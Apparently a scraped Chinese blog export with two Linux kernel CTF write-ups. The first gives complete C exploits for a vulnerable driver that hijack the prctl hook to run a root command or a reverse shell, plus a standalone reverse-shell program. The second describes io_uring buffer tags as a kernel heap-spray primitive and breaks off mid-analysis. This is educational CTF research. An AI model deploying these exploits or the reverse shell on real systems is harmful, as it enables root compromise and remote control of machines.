...\n\nprctl源码中调用了security_task_prctl函数\nint security_task_prctl(int option, unsigned long arg2, unsigned long arg3,                        unsigned long arg4, unsigned long arg5)&#123;    int thisrc;    int rc = -ENOSYS;    struct security_hook_list *hp;    list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, list) &#123;        thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);        if (thisrc != -ENOSYS) &#123;            rc = thisrc;            if (thisrc != 0)                break;        &#125;    &#125;    return rc;&#125;\n\n函数调用了task_prctl表里的函数，因此，如果我们劫持task_prctl表，就能通过执行prctl来执行我们想要的函数，比如call_usermodehelper函数。\n提一下call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。\nint call_usermodehelper(char *path, char **argv, char **envp, int wait)&#123;\tstruct subprocess_info *info;\tgfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;\tinfo = call_usermodehelper_setup(path, argv, envp, gfp_mask,\t\t\t\t\t NULL, NULL, NULL);\tif (info == NULL)\t\treturn -ENOMEM;\treturn call_usermodehelper_exec(info, wait);&#125;\n\n查看引用发现mce_do_trigger函数有调用call_usermodehelper并且第一个参数为全局变量\nstatic void mce_do_trigger(struct work_struct *work)&#123;\tcall_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);&#125;\n\n但是需要改的东西比较多，所以寻找更好的gadget\nstatic int run_cmd(const char *cmd)&#123;\tchar **argv;\tstatic char *envp[] = &#123;\t\t&quot;HOME=/&quot;,\t\t&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;,\t\tNULL\t&#125;;\tint ret;\targv = argv_split(GFP_KERNEL, cmd, NULL);\tif (argv) &#123;\t\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\t\targv_free(argv);\t&#125; else &#123;\t\tret = -ENOMEM;\t&#125;\treturn ret;&#125;static int __orderly_reboot(void)&#123;\tint ret;\tret = run_cmd(reboot_cmd);\tif (ret) &#123;\t\tpr_warn(&quot;Failed to start orderly reboot: forcing the issue\\n&quot;);\t\temergency_sync();\t\tkernel_restart(NULL);\t&#125;\treturn ret;&#125;static int __orderly_poweroff(bool force)&#123;\tint ret;\tret = run_cmd(poweroff_cmd);\tif (ret &amp;&amp; force) &#123;\t\tpr_warn(&quot;Failed to start orderly shutdown: forcing the issue\\n&quot;);\t\t/*\t\t * I guess this should try to kick off some daemon to sync and\t\t * poweroff asap.  Or not even bother syncing if we&#x27;re doing an\t\t * emergency shutdown?\t\t */\t\temergency_sync();\t\tkernel_power_off();\t&#125;\treturn ret;&#125;\n\n可以看到这里的run_cmd是会调用call_usermodehelper，我们只需要把prctl_task劫持到这几个函数，比如__orderly_poweroff，然后篡改poweroff_cmd为我们需要执行的二进制文件路径。接着调用prctl，就会以root权限执行我们的二进制文件，从而提权。为了实现上述目标，我们首先需要得到内核基址，在上一篇也提到了怎么计算出vdso地址，我们有了vdso地址也可以得出内核基地址了。\n综上可得出exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tsize_t kernel_base = 0;\tsize_t selinux_disable_addr = 0x2C7BA0;\tsize_t prctl_hook = 0x124FD00;\tsize_t order_cmd = 0x123D1E0;\tsize_t poweroff_work_func_addr = 0x9C4C0;\tint root_cred[12];\tint offset;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tfd = open(&quot;/proc/simp1e&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tkernel_base = addr - 0x1020000;\tprctl_hook += kernel_base;\torder_cmd += kernel_base;\tpoweroff_work_func_addr += kernel_base;\tprintf(&quot;[+] found kernel base: %lx\\n&quot;, kernel_base);\tprintf(&quot;[+] found prctl_hook: %lx\\n&quot;, prctl_hook);\tprintf(&quot;[+] found order_cmd : %lx\\n&quot;, order_cmd);\tprintf(&quot;[+] found poweroff_work_func_addr: %lx\\n&quot;, poweroff_work_func_addr);\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tstrcpy(buf, &quot;/bin/chmod 777 /flag\\0&quot;);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = strlen(buf) + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd + 20 - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\t*(size_t *)buf = poweroff_work_func_addr;\tseek_args.id = alloc_args.id;\tseek_args.index = prctl_hook - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 20 + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tprctl(addr, 2, addr, addr, 2);\treturn 0;&#125;\n\n以上程序的效果是修改权限，当然也是可以反弹shell的，不过需要再写一个程序并且上面的exp也需要修改一下\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tsize_t kernel_base = 0;\tsize_t selinux_disable_addr = 0x2C7BA0;\tsize_t prctl_hook = 0x124FD00;\tsize_t order_cmd = 0x123D1E0;\tsize_t poweroff_work_func_addr = 0x9C4C0;\tint root_cred[12];\tint offset;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tfd = open(&quot;/proc/simp1e&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tkernel_base = addr - 0x1020000;\tprctl_hook += kernel_base;\torder_cmd += kernel_base;\tpoweroff_work_func_addr += kernel_base;\tprintf(&quot;[+] found kernel base: %lx\\n&quot;, kernel_base);\tprintf(&quot;[+] found prctl_hook: %lx\\n&quot;, prctl_hook);\tprintf(&quot;[+] found order_cmd : %lx\\n&quot;, order_cmd);\tprintf(&quot;[+] found poweroff_work_func_addr: %lx\\n&quot;, poweroff_work_func_addr);\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tstrcpy(buf, &quot;/reverse_shell\\0&quot;);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = strlen(buf) + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd + 13 - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\t*(size_t *)buf = poweroff_work_func_addr;\tseek_args.id = alloc_args.id;\tseek_args.index = prctl_hook - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 20 + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tif (fork() == 0)\t&#123;\t\tprctl(addr, 2, addr, addr, 2);\t\texit(-1);\t&#125;\tsystem(&quot;nc -l -p 4444&quot;);\treturn 0;&#125;\n\n反弹shell程序：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;char server_ip[] = &quot;127.0.0.1&quot;;uint32_t server_port = 4444;int main()&#123;    int sock = socket(AF_INET, SOCK_STREAM, 0);    struct sockaddr_in attacker_addr = &#123;0&#125;;    attacker_addr.sin_family = AF_INET;    attacker_addr.sin_port = htons(server_port);    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);    while (connect(sock, (struct sockaddr *)&amp;attacker_addr, sizeof(attacker_addr)) != 0)        ;    dup2(sock, 0);    dup2(sock, 1);    dup2(sock, 2);    system(&quot;/bin/sh&quot;);&#125;\n\n题目链接：https://github.com/196082/196082\n\n参考链接：http://p4nda.top/2018/11/07/stringipc/#3-HijackPrctl\n","categories":["Linux Kernel"],"tags":["HijackPrctl"]},{"title":"io_uring在kernel pwn中的优异表现","url":"/2023/04/20/io-uring/","content":"前言目前各种比赛的各种赛制真的是让人十分难受，以至于感觉自己不怎么适合打比赛了。所以打算静下心来复现一场比赛，在RCTF中找到分值最低的一道题。做的过程中越看越不对劲，还算是有难度的一道内核堆题怎么被打烂了，一搜才发现是有非预期解。但我头铁，静下心来用预期解打，索性功夫不负有心人在这道题目中发现了不得了的东西。\n目前的窘境如果存在UAF的object规定大小只能为0x10的话，各位肯定会想到使用可以实现分配任意大小object的函数。\n所以如果提到内核中可以达到任意大小的结构体时估计各位会想到setxattr、msg_msg之类的。但是这两者均具有很大的局限性，setxattr前面提到过，这个在调用完成后会kfree掉使用的object，并且在高版本的linux内核中这个函数早已被修改了。msg_msg这个结构体就更为明显了，需要用很大的空间来保存结构体中的成员。\n因为是size很小的堆块所以各位可能还会思考到一部分结构体例如:seq_operations、shm_file_data之类的。但是他们的size也是0x20。\nIO_uring网上关于io_uring对于kernel pwn的利用相对较少，特别是中文文章，我几乎没搜到，搜到的也只是对其进行介绍，并没有实际的操作之类的。所以为了写这篇文章我看了两天Linux内核的源码，眼睛都要瞎了！！！\n介绍关于IO_uring的介绍在网上其实很多。io_uring是2019年Linux 5.1内核首次引入的高性能异步I/O框架，可以显着加速I/O密集型应用程序的性能。为了减少 I/O 操作时的内存映射，该模块允许用户预先注册一些固定的 I/O 缓冲区，以便这些缓冲区可以被重用。这里推荐大家最好去看看关于他的实现。\n分析这里算是这篇文章的重点！\n分配object当我们调用io_uring_register_buffers_tags函数时：\nint io_uring_register_buffers_tags(struct io_uring *ring,\t\t\t\t   const struct iovec *iovecs,\t\t\t\t   const __u64 *tags,\t\t\t\t   unsigned nr)&#123;\tstruct io_uring_rsrc_register reg = &#123;\t\t.nr = nr,\t\t.data = (unsigned long)iovecs,\t\t.tags = (unsigned long)tags,\t&#125;;\treturn do_register(ring, IORING_REGISTER_BUFFERS2, &amp;reg, sizeof(reg));&#125;\n\n#define DIV_ROUND_UP(n,d) (((n) + (d) - 1) / (d))static __cold void **io_alloc_page_table(size_t size)&#123;\tunsigned i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);\tsize_t init_size = size;\tvoid **table;\ttable = kcalloc(nr_tables, sizeof(*table), GFP_KERNEL_ACCOUNT);\tif (!table)\t\treturn NULL;\tfor (i = 0; i &lt; nr_tables; i++) &#123;\t\tunsigned int this_size = min_t(size_t, size, PAGE_SIZE);\t\ttable[i] = kzalloc(this_size, GFP_KERNEL_ACCOUNT);\t\tif (!table[i]) &#123;\t\t\tio_free_page_table(table, init_size);\t\t\treturn NULL;\t\t&#125;\t\tsize -= this_size;\t&#125;\treturn table;&#125;\n\n最终会进入上面这个函数中，其中的size是我们可以直接进行控制的，可以明显的看出来这里可以真正实现任意大小分配，并且在table[i]也就是ctx-&gt;buf_data-&gt;tags[i]中不含有任何指针或者数据之类的，在table也就是ctx-&gt;buf_data-&gt;tags中只含有后面分配的object指针。\n更新object当我们调用io_uring_register_buffers_update_tag函数时，可以对tags也就是我们上面table[i]中分配的object进行内容更新：\nint io_uring_register_buffers_update_tag(struct io_uring *ring, unsigned off,\t\t\t\t\t const struct iovec *iovecs,\t\t\t\t\t const __u64 *tags,\t\t\t\t\t unsigned nr)&#123;\tstruct io_uring_rsrc_update2 up = &#123;\t\t.offset\t= off,\t\t.data = (unsigned long)iovecs,\t\t.tags = (unsigned long)tags,\t\t.nr = nr,\t&#125;;\treturn do_register(ring, IORING_REGISTER_BUFFERS_UPDATE, &amp;up, sizeof(up));&#125;\n\n#define PAGE_SHIFT 12#define IO_RSRC_TAG_TABLE_SHIFT\t(PAGE_SHIFT - 3)static inline u64 *io_get_tag_slot(struct io_rsrc_data *data, unsigned int idx)&#123;\tunsigned int off = idx &amp; IO_RSRC_TAG_TABLE_MASK;\tunsigned int table_idx = idx &gt;&gt; IO_RSRC_TAG_TABLE_SHIFT;\treturn &amp;data-&gt;tags[table_idx][off];&#125;static int __io_sqe_buffers_update(struct io_ring_ctx *ctx,\t\t\t\t   struct io_uring_rsrc_update2 *up,\t\t\t\t   unsigned int nr_args)&#123;\tu64 __user *tags = u64_to_user_ptr(up-&gt;tags);\tstruct iovec iov, __user *iovs = u64_to_user_ptr(up-&gt;data);\tstruct page *last_hpage = NULL;\tbool needs_switch = false;\t__u32 done;\tint i, err;\tif (!ctx-&gt;buf_data)\t\treturn -ENXIO;\tif (up-&gt;offset + nr_args &gt; ctx-&gt;nr_user_bufs)\t\treturn -EINVAL;\tfor (done = 0; done &lt; nr_args; done++) &#123;\t\tstruct io_mapped_ubuf *imu;\t\tint offset = up-&gt;offset + done;\t\tu64 tag = 0;\t\terr = io_copy_iov(ctx, &amp;iov, iovs, done);\t\tif (err)\t\t\tbreak;\t\tif (tags &amp;&amp; copy_from_user(&amp;tag, &amp;tags[done], sizeof(tag))) &#123;\t\t\terr = -EFAULT;\t\t\tbreak;\t\t&#125;\t\terr = io_buffer_validate(&amp;iov);\t\tif (err)\t\t\tbreak;\t\tif (!iov.iov_base &amp;&amp; tag) &#123;\t\t\terr = -EINVAL;\t\t\tbreak;\t\t&#125;\t\terr = io_sqe_buffer_register(ctx, &amp;iov, &amp;imu, &amp;last_hpage);\t\tif (err)\t\t\tbreak;\t\ti = array_index_nospec(offset, ctx-&gt;nr_user_bufs);\t\tif (ctx-&gt;user_bufs[i] != ctx-&gt;dummy_ubuf) &#123;\t\t\terr = io_queue_rsrc_removal(ctx-&gt;buf_data, i,\t\t\t\t\t\t    ctx-&gt;rsrc_node, ctx-&gt;user_bufs[i]);\t\t\tif (unlikely(err)) &#123;\t\t\t\tio_buffer_unmap(ctx, &amp;imu);\t\t\t\tbreak;\t\t\t&#125;\t\t\tctx-&gt;user_bufs[i] = ctx-&gt;dummy_ubuf;\t\t\tneeds_switch = true;\t\t&#125;\t\tctx-&gt;user_bufs[i] = imu;\t\t*io_get_tag_slot(ctx-&gt;buf_data, offset) = tag;\t&#125;\tif (needs_switch)\t\tio_rsrc_node_switch(ctx, ctx-&gt;buf_data);\treturn done ? done : err;&#125;\n\n可以看到他这里更新方式也很独树一帜，并不是简单的copy_from_user之类的，而是八个字节八个字节的写。\n释放object调用io_uring_unregister_buffers函数即可对所有object进行释放：\nint io_uring_unregister_buffers(struct io_uring *ring)&#123;\treturn do_register(ring, IORING_UNREGISTER_BUFFERS, NULL, 0);&#125;\n\nstatic void io_free_page_table(void **table, size_t size)&#123;\tunsigned i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);\tfor (i = 0; i &lt; nr_tables; i++)\t\tkfree(table[i]);\tkfree(table);&#125;\n\n最终调用到的是上面这个函数中，其中table的含义跟分配时一致。\n总结通过上面三个方向的分析，各位大佬应该能想到IO_uring在很多方面都可以进行利用，不过他的缺点也很明显，他无法读取堆块上的内容(可能是我没找到，找到的佬可以留言一下)。\nRCTF2022 game现在开始题目分析，出题人师傅是给了源代码的，但是通过ida逆向并不困难，所以下面还是给ida中的代码\n驱动分析void __fastcall hhoge_unlocked_ioctl(__int64 a1, unsigned int a2, __int64 a3)&#123;  __int64 v3; // rbx  __int64 v4; // rbp  __int64 v5; // r12  __int64 v6; // r13  __int64 v7; // r14  __int64 v8; // r15  __int64 v9; // rdx  Maind *maind_chunk; // r13  __int64 new_chunk; // rax  char *username; // rdi  __int64 v13; // rcx  _DWORD *v14; // rsi  _QWORD v15[5]; // [rsp-58h] [rbp-58h] BYREF  __int64 v16; // [rsp-30h] [rbp-30h]  __int64 v17; // [rsp-28h] [rbp-28h]  __int64 v18; // [rsp-20h] [rbp-20h]  __int64 v19; // [rsp-18h] [rbp-18h]  __int64 v20; // [rsp-10h] [rbp-10h]  __int64 v21; // [rsp-8h] [rbp-8h]  _fentry__();  v21 = v4;  v20 = v8;  v19 = v7;  v18 = v6;  v17 = v5;  v16 = v3;  maind_chunk = *(Maind **)(a1 + 0xC8);  v15[4] = __readgsqword(0x28u);  if ( maind_chunk )  &#123;    copy_from_user(v15, v9, 0x20LL);    if ( a2 == 0x72 )    &#123;      change(maind_chunk, v15);    &#125;    else if ( a2 &lt;= 0x72 )    &#123;      if ( a2 == 0x16 )      &#123;        hhoge_unlocked_ioctl_cold();      &#125;      else if ( a2 &lt;= 0x16 )      &#123;        if ( a2 )        &#123;          if ( a2 == 1 )            reborn_0(maind_chunk);        &#125;        else        &#123;          printk(&quot;born&quot;);          new_chunk = kmem_cache_alloc_trace(kmalloc_caches[5], 0xDC0LL, 0x18LL);          username = maind_chunk-&gt;username;          v13 = 8LL;          v14 = v15;          maind_chunk-&gt;cur = (void *)new_chunk;          *(_QWORD *)(new_chunk + 8) = &quot;ordinary&quot;;          maind_chunk-&gt;id = 0LL;          while ( v13 )          &#123;            *(_DWORD *)username = *v14++;            username += 4;            --v13;          &#125;        &#125;      &#125;    &#125;  &#125;&#125;\n\n在ioctl中分为了四类。\nvoid __fastcall reborn_0(Maind *context)&#123;  void *v2; // rax  _DWORD *cur; // rdx  __int64 v4; // rcx  _DWORD *v5; // rdi  _DWORD *v6; // rsi  _fentry__();  printk(&quot;reborn&quot;);  v2 = (void *)kmem_cache_alloc_trace(kmalloc_caches[5], 0xDC0LL, 0x18LL);  cur = context-&gt;cur;  v4 = 6LL;  context-&gt;prv = v2;  v5 = v2;  v6 = cur;  while ( v4 )  &#123;    *v5++ = *v6++;    --v4;  &#125;  *((_QWORD *)cur + 1) = &quot;unlucky&quot;;  *((_QWORD *)context-&gt;cur + 2) = 0xFFFFFFFFFFFE40AELL;  ++context-&gt;id;&#125;\n\n其中的reborn_0函数并没有将新分配的object给到cur指针中，而是给到了context-&gt;prv中去了。并且会把context-&gt;cur[0]的内容复制到context-&gt;prv[0]中去。\nvoid __fastcall change_cold(Maind *a1)&#123;  __int64 v1; // rbp  __int64 v2; // r12  char *v4; // rax  const char *v5; // r14  char *v6; // rax  unsigned __int64 v7; // kr08_8  _QWORD *cur; // r13  __int64 v9; // r15  const char *v10; // rdi  int v11; // eax  int v12; // edx  printk(&quot;change&quot;);  while ( 1 )  &#123;    do    &#123;      v4 = strsep((char **)(v1 - 0x38), &quot;,&quot;);      v5 = v4;      if ( !v4 )LABEL_24:        JUMPOUT(0x132LL);    &#125;    while ( !*v4 );    v6 = strchr(v4, 0x3D);    if ( !v6 )      break;    if ( v5 != v6 )    &#123;      *v6 = 0;      v7 = strlen(v6 + 1) + 1;      if ( v7 - 1 &lt;= 9 )      &#123;        cur = a1-&gt;cur;        if ( !cur )          goto LABEL_24;        if ( v6 != (char *)-1LL )        &#123;          v2 = kmemdup_nul(v6 + 1, v7 - 1, 0xCC0LL);          if ( !v2 )            goto LABEL_24;        &#125;LABEL_10:        v9 = 0LL;        do        &#123;          v10 = key_list[v9];          if ( !v10 )            goto LABEL_18;          *(_DWORD *)(v1 - 0x3C) = v9++;          v11 = strcmp(v10, v5);          v12 = *(_DWORD *)(v1 - 0x3C);        &#125;        while ( v11 );        if ( v12 == 2 )        &#123;          cur[2] += v2;        &#125;        else if ( v12 &lt;= 2 )        &#123;          if ( 